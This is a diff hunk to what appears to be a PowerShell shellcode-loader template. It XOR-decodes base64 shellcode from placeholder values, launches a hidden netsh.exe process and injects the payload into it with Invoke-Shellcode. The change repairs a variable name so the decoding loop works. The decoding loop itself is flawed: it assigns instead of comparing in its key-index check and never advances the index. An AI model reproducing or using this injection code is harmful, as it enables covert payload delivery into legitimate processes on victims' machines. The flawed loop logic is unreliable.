@@ -488,11 +488,11 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
 }
 $k = [System.Convert]::frombase64string("##BASE64KEY##");
 $sc = [System.Convert]::frombase64string("##BASE64SHELLCODE##");
-for($i=0;$i -lt $sc_enc.Length;$i++){
+for($i=0;$i -lt $sc.Length;$i++){
     if($ki=$k.Length){
         $ki=0;
     }
-    $sc_enc[$i] = $sc_enc[$i] -bxor $k[$ki];
+    $sc[$i] = $sc[$i] -bxor $k[$ki];
 }
 $processid = (start-process -filepath "netsh.exe" -WindowStyle hidden -passthru).Id
 Invoke-Shellcode -Shellcode $sc -Force -ProcessId $processid
